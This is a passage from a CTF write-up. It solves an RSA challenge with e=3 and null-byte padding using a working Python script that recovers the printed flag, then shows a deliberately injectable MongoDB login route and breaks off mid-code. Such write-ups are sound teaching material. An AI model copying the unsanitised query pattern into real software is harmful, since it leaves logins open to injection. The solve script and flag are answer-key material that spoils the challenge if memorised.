keyword\">import</span> flag\n\n<span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">87</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># leave space for padding since padding is secure</span>\n\np <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\nn <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nd <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>center<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pad on both sides for extra security</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n = {}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e = {}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c = {}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">n <span class=\"token operator\">=</span> <span class=\"token number\">16930533490098193592341875268338741038205464836112117606904075086009220456281348541825239348922340771982668304609839919714900815429989903238980995651506801223966153299092163805895061846586943843402382398048697158458017696120659704031304155071717980681280735059759239823752407134078600922884956042774012460082427687595370305553669279649079979451317522908818275946004224509637278839696644435502488800296253302309479834551923862247827826150368412526870932677430329200284984145938907415715817446807045958350179492654072137889859861558737138356897740471740801040559205563042789209526133114839452676031855075611266153108409</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">11517346521350511968078082236628354270939363562359338628104189053516869171468429130280219507678669249746227256625771360798579618712012428887882896227522052222656646536694635021145269394726332158046739239080891813226092060005024523599517854343024406506186025829868533799026231811239816891319566880015622494533461653189752596749235331065273556793035000698955959016688177480102004337980417906733597189524580640648702223430440368954613314994218791688337730722144627325417358973332458080507250983131615055175113690064940592354460257487958530863702022217749857014952140922260404696268641696045086730674980684704510707326989</span></code></pre></div>\n<hr>\n<h3>Solution</h3>\n<p>We're given an encryption script and some parameters. <code>n</code> is too hard to factor and even though <code>e</code> is only 3, the cube root of <code>c</code> won't get us the flag because of the padding. However, on further inspection, we notice that the padding's effects can be reversed. A couple things to notice first:</p>\n<ul>\n<li>The flag is less than 87 characters long and the total length of the plaintext that will be encrypted is 255.</li>\n<li>If the flag length is odd, there will be one extra padding to the left of the flag.</li>\n<li>Padding to the left with <code>b'\\x00'</code> is essentially a no-op, it doesn't do anything when getting the long representation of the bytes.</li>\n<li>Padding to the right with <code>b'\\x00'</code> is essentially a left shift of two bits, this is equivalent to multiplying by <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn><msup><mn>6</mn><mn>2</mn></msup><mo>=</mo><mn>256</mn></mrow><annotation encoding=\"application/x-tex\">16^2 = 256</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">256</span></span></span></span></span> for the long representation of the bytes.</li>\n</ul>\n<p>Hence, padding by <code>pad_len</code> times of <code>b'\\x00'</code> to the right of the flag is equivalent to multiplying the long representation of the flag by <code>256 ^ pad_len</code>. From this, we set up the equation: (letting <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">f =</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span></span> <code>flag</code>, <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">l =</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span></span> <code>pad_len</code>)</p>\n<div class=\"math math-display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.2500em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mo stretchy=\"false\">(</mo><mi>f</mi><mo>×</mo><mn>25</mn><msup><mn>6</mn><mi>l</mi></msup><msup><mo stretchy=\"false\">)</mo><mi>e</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>≡</mo><mi>c</mi><mspace></mspace><mspace width=\"1em\"></mspace><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mspace width=\"0.3333333333333333em\"></mspace><mi>n</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msup><mi>f</mi><mi>e</mi></msup><mo>×</mo><mn>25</mn><msup><mn>6</mn><mrow><mi>l</mi><mi>e</mi></mrow></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>≡</mo><mi>c</mi><mspace></mspace><mspace width=\"1em\"></mspace><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mspace width=\"0.3333333333333333em\"></mspace><mi>n</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msup><mi>f</mi><mi>e</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>≡</mo><mi>d</mi><mi>c</mi><mspace></mspace><mspace width=\"1em\"></mspace><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mspace width=\"0.3333333333333333em\"></mspace><mi>n</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned} (f\\times256^l)^e &#x26;\\equiv c \\pmod n \\cr \\implies f^e\\times256^{le} &#x26;\\equiv c \\pmod n \\cr \\implies f^e &#x26;\\equiv dc \\pmod n \\end{aligned}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.618216em;vertical-align:-2.059108em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.559108em;\"><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">25</span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.100892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⟹</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">25</span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-1.600892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⟹</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.059108em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.559108em;\"><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.100892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span><span style=\"top:-1.600892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">c</span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.059108em;\"><span></span></span></span></span></span></span></span></span></span></span></span></div>\n<p>Where <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span></span> is the modular inverse of <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>25</mn><msup><mn>6</mn><mi>l</mi></msup></mrow><annotation encoding=\"application/x-tex\">256^l</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.849108em;vertical-align:0em;\"></span><span class=\"mord\">25</span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span></span></span></span> in the integer mod ring of order <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span></span>.</p>\n<p>Thus, we get</p>\n<div class=\"math math-display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>f</mi><mi>e</mi></msup><mo>=</mo><mi>k</mi><mi>n</mi><mo>+</mo><mo stretchy=\"false\">(</mo><mi>d</mi><mi>c</mi><mspace></mspace><mspace width=\"1em\"></mspace><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f^e = kn + (dc \\mod n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9088319999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">kn</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">c</span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:1em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span></span></div>\n<p>For some feasibly brute forceable integer <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span>.</p>\n<p>Iff the flag is less than or equal to 85 characters long, then <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">k = 0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span></span> would give us a value which we could take the cube root of to get the flag. Since this isn't the case (which we can easily check), and since the flag's length is less than 87, we conclude that the flag must be 86 characters long.</p>\n<p>This theory implemented in Python:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> iroot\nn <span class=\"token operator\">=</span> <span class=\"token number\">16930533490098193592341875268338741038205464836112117606904075086009220456281348541825239348922340771982668304609839919714900815429989903238980995651506801223966153299092163805895061846586943843402382398048697158458017696120659704031304155071717980681280735059759239823752407134078600922884956042774012460082427687595370305553669279649079979451317522908818275946004224509637278839696644435502488800296253302309479834551923862247827826150368412526870932677430329200284984145938907415715817446807045958350179492654072137889859861558737138356897740471740801040559205563042789209526133114839452676031855075611266153108409</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">11517346521350511968078082236628354270939363562359338628104189053516869171468429130280219507678669249746227256625771360798579618712012428887882896227522052222656646536694635021145269394726332158046739239080891813226092060005024523599517854343024406506186025829868533799026231811239816891319566880015622494533461653189752596749235331065273556793035000698955959016688177480102004337980417906733597189524580640648702223430440368954613314994218791688337730722144627325417358973332458080507250983131615055175113690064940592354460257487958530863702022217749857014952140922260404696268641696045086730674980684704510707326989</span>\n\nflag_len <span class=\"token operator\">=</span> <span class=\"token number\">86</span>\npad_len <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token operator\">-</span>flag_len<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    flag_cubed <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span> inverse<span class=\"token punctuation\">(</span><span class=\"token number\">256</span> <span class=\"token operator\">**</span> <span class=\"token punctuation\">(</span>pad_len<span class=\"token operator\">*</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n <span class=\"token operator\">+</span> k<span class=\"token operator\">*</span>n\n    flag<span class=\"token punctuation\">,</span> is_cube <span class=\"token operator\">=</span> iroot<span class=\"token punctuation\">(</span>flag_cubed<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> is_cube<span class=\"token punctuation\">:</span>\n        flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'actf{'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">></span> python decrypt<span class=\"token punctuation\">.</span>py\nactf<span class=\"token punctuation\">{</span>bad_padding_makes_u_very_sadding_even_if_u_add_words_just_for_the_sake_of_adding<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Notes</h3>\n<p>I wasn't able to complete this challenge during the CTF :(\nI learnt and referenced a lot from <a href=\"https://github.com/p4-team/ctf/tree/master/2018-12-08-hxp/crypto_daring\">this writeup</a>.</p>\n<hr>\n<h1>Web</h1>\n<h2>No Sequels</h2>\n<h3>Web - 50 points (solved)</h3>\n<blockquote>\n<p>The prequels sucked, and the sequels aren't much better, but at least we always have the <a href=\"https://nosequels.2019.chall.actf.co/\">original trilogy</a>.</p>\n<p>Author: SirIan</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> extended<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">...</span>\n\nrouter<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">,</span> verifyJwt<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// monk instance</span>\n    <span class=\"token keyword\">var</span> db <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>db<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">var</span> user <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>user <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>pass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"One or more fields were not provided.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">var</span> query <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        username<span class=\"token operator\">:</span> user<span class=\"token punctuation\">,</span>\n        password<span class=\"token operator\">:</span> pass\n    <span class=\"token punctuation\">}</span>\n\n    db<span class=\"token punctuation\">.</span><span class=\"token function\">collection</span><span class=\"token punctuation\">(</span><span class=\"token string\">'users'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> user</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrong username or password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span>\n        <span class=\"token punctuation\">}</span>\n\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">cookie</span><span class=\"token punctuation\">(</span><span class=\"token string\">'token'</span><span class=\"token punctuation\">,</span> jwt<span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>name<span class=\"token operator\">:</span> user<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> authenticated<span class=\"token 